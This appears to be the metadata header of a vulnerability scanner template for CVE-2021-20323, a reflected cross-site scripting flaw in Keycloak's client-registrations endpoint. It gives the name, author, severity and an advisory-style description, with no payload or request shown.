id: CVE-2021-20323

info:
  name: Keycloak < 18.0.0 - Cross Site Scripting
  author: ndmalc
  severity: medium
  description: |
    Keycloak before 18.0.0 and after 10.0.0 allows a reflected XSS on client-registrations endpoint. On POST request, when a request is submitted, the application does not sanitize unknown attribute name before including it in the error response with a 'Content-Type' of text/hml. Once reflected, the response is interpreted as html. This can be performed on any realm present on the Keycloak instance. Currently, due to the bug requiring Content-Type application/json and is submitted via a POST, there is no common path to exploit that have a user impact.
